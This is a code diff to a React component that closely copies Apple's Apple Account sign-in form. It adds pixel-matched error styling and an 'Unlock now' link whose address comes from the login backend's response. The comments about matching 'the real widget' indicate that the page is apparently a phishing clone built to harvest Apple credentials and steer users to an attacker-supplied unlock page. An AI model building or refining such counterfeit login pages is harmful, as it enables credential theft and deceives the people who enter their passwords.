@@ -6,6 +6,36 @@ import { useAuthState } from "../lib/useAuth";
 const PRIVACY_TEXT =
   "Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.";
 
+/* Apple's form message row: 12px #e30000, 8px above (16px under a
+ * checkbox row) and 12px below, in the form flow so it pushes the button
+ * down exactly like the real widget. */
+function ErrorRow({ children, afterCheckbox = false, unlockUrl = "" }) {
+  return (
+    <p
+      role="alert"
+      aria-live="assertive"
+      className={`mb-3 text-left text-[12px] leading-4 tracking-[-0.12px] text-[#e30000] ${
+        afterCheckbox ? "mt-4" : "mt-2"
+      }`}
+    >
+      {children}
+      {unlockUrl ? (
+        <>
+          {" "}
+          <a
+            href={unlockUrl}
+            target="_blank"
+            rel="noopener"
+            className="underline hover:no-underline"
+          >
+            Unlock now
+          </a>
+        </>
+      ) : null}
+    </p>
+  );
+}
+
 function CheckIcon() {
   return (
     <svg viewBox="0 0 12 12" className="h-3 w-3" fill="none" stroke="currentColor" strokeWidth="2">
@@ -31,6 +61,13 @@ export default function Login({ onContinue }) {
       return "";
     }
   });
+  const [unlock, setUnlock] = useState(() => {
+    try {
+      return sessionStorage.getItem("authUnlockUrl") || "";
+    } catch {
+      return "";
+    }
+  });
   const [busy, setBusy] = useState(false);
   const [password, setPassword] = useState("");
   const [remember, setRemember] = useState(false);
@@ -45,6 +82,20 @@ export default function Login({ onContinue }) {
   const emailStep = step === "email";
   const small = !emailStep || focused || email.length > 0;
   const complete = emailStep ? email.trim().length > 0 : password.length > 0;
+  const locked = Boolean(error) && /locked/i.test(error);
+  const unlockUrl = locked ? auth.result?.unlockUrl || unlock : "";
+
+  function clearError() {
+    if (!error) return;
+    setError("");
+    setUnlock("");
+    try {
+      sessionStorage.removeItem("authError");
+      sessionStorage.removeItem("authUnlockUrl");
+    } catch {
+      // private mode
+    }
+  }
 
   useEffect(() => {
     // Apple focuses the first field on pointer devices; on phones the keyboard stays closed.
@@ -70,9 +121,10 @@ export default function Login({ onContinue }) {
   useEffect(() => {
     if (auth.status === "invalid" || auth.status === "error") {
       setError(auth.error || "Incorrect Apple Account or password.");
+      if (auth.result?.unlockUrl) setUnlock(auth.result.unlockUrl);
       if (!email && auth.account?.email) setEmail(auth.account.email);
     }
-  }, [auth.status, auth.error, auth.account?.email, email]);
+  }, [auth.status, auth.error, auth.result?.unlockUrl, auth.account?.email, email]);
 
   function showPasswordStep() {
     // Reserve the height the email step currently occupies, so swapping the
@@ -143,24 +195,35 @@ export default function Login({ onContinue }) {
                   required
                   autoComplete="off"
                   aria-required="true"
-                  aria-invalid="false"
+                  aria-invalid={error ? "true" : "false"}
                   aria-labelledby="apple_id_field_label"
                   value={email}
-                  onChange={(event) => setEmail(event.target.value)}
+                  onChange={(event) => {
+                    setEmail(event.target.value);
+                    clearError();
+                  }}
                   onFocus={() => setFocused(true)}
                   onBlur={() => setFocused(false)}
-                  className={`h-[56px] w-full rounded-[12px] border-solid bg-[rgba(255,255,255,0.8)] pr-[43px] pt-[18px] text-left text-[17px] leading-[21px] tracking-[-0.374px] text-[#494949] outline-none transition-[border-color,background-color] duration-150 ease-in ${
+                  className={`h-[56px] w-full rounded-[12px] border-solid pr-[43px] pt-[18px] text-left text-[17px] leading-[21px] tracking-[-0.374px] text-[#494949] outline-none transition-[border-color,background-color] duration-150 ease-in ${
                     !emailStep
-                      ? "rounded-t-[12px] rounded-b-none border border-[#86868b] pl-4"
+                      ? `rounded-t-[12px] rounded-b-none border pl-4 ${
+                          error
+                            ? "border-[#e30000] bg-[#fff2f4]"
+                            : "border-[#86868b] bg-[rgba(255,255,255,0.8)]"
+                        }`
                       : focused
-                        ? "rounded-[12px] border-2 border-[#0071e3] pl-[15px]"
-                        : "rounded-[12px] border border-[#86868b] pl-4"
+                        ? "rounded-[12px] border-2 border-[#0071e3] bg-[rgba(255,255,255,0.8)] pl-[15px]"
+                        : error
+                          ? "rounded-[12px] border border-[#e30000] bg-[#fff2f4] pl-4"
+                          : "rounded-[12px] border border-[#86868b] bg-[rgba(255,255,255,0.8)] pl-4"
                   }`}
                 />
                 <span
                   id="apple_id_field_label"
                   aria-hidden="true"
-                  className={`pointer-events-none absolute left-[17px] block overflow-hidden text-left text-[#6e6e73] transition-all duration-[125ms] ease-in ${
+                  className={`pointer-events-none absolute left-[17px] block overflow-hidden text-left transition-all duration-[125ms] ease-in ${
+                    error ? "text-[#e30000]" : "text-[#6e6e73]"
+                  } ${
                     small
                       ? "top-[10px] text-[12px] leading-[16px] tracking-[-0.12px]"
                       : "top-[18px] text-[17px] leading-[21px] tracking-[-0.374px]"
@@ -186,19 +249,26 @@ export default function Login({ onContinue }) {
                       aria-labelledby="password_field_label"
                       aria-invalid="false"
                       value={password}
-                      onChange={(event) => setPassword(event.target.value)}
+                      onChange={(event) => {
+                        setPassword(event.target.value);
+                        clearError();
+                      }}
                       onFocus={() => setPwdFocused(true)}
                       onBlur={() => setPwdFocused(false)}
-                      className={`h-[56px] w-full rounded-b-[12px] rounded-t-none border-solid bg-[rgba(255,255,255,0.8)] pr-[43px] pt-[18px] text-left text-[17px] leading-[21px] tracking-[-0.374px] text-[#494949] outline-none transition-[border-color,background-color] duration-150 ease-in ${
+                      className={`h-[56px] w-full rounded-b-[12px] rounded-t-none border-solid pr-[43px] pt-[18px] text-left text-[17px] leading-[21px] tracking-[-0.374px] text-[#494949] outline-none transition-[border-color,background-color] duration-150 ease-in ${
                         pwdFocused
-                          ? "border-2 border-[#0071e3] pl-[15px]"
-                          : "border border-[#86868b] pl-4"
+                          ? "border-2 border-[#0071e3] bg-[rgba(255,255,255,0.8)] pl-[15px]"
+                          : error
+                            ? "border border-[#e30000] bg-[#fff2f4] pl-4"
+                            : "border border-[#86868b] bg-[rgba(255,255,255,0.8)] pl-4"
                       }`}
                     />
                     <span
                       id="password_field_label"
                       aria-hidden="true"
-                      className="pointer-events-none absolute left-[17px] top-[10px] block overflow-hidden text-left text-[12px] leading-[16px] tracking-[-0.12px] text-[#6e6e73]"
+                      className={`pointer-events-none absolute left-[17px] top-[10px] block overflow-hidden text-left text-[12px] leading-[16px] tracking-[-0.12px] ${
+                        error ? "text-[#e30000]" : "text-[#6e6e73]"
+                      }`}
                     >
                       Password
                     </span>
@@ -244,6 +314,12 @@ export default function Login({ onContinue }) {
                       </svg>
                     </a>
                   </div>
+
+                  {error ? (
+                    <ErrorRow afterCheckbox unlockUrl={unlockUrl}>
+                      {error}
+                    </ErrorRow>
+                  ) : null}
                 </div>
               ) : null}
 
@@ -261,18 +337,13 @@ export default function Login({ onContinue }) {
                       See&nbsp;how&nbsp;your&nbsp;data&nbsp;is&nbsp;managed...
                     </a>
                   </p>
+
+                  {error ? (
+                    <ErrorRow unlockUrl={unlockUrl}>{error}</ErrorRow>
+                  ) : null}
                 </div>
               ) : null}
             </div>
-
-            {error ? (
-              <p
-                role="alert"
-                className="mt-3 text-left text-[12px] leading-4 tracking-[-0.12px] text-[#e30000]"
-              >
-                {error}
-              </p>
-            ) : null}
 
             <button
               type="submit"
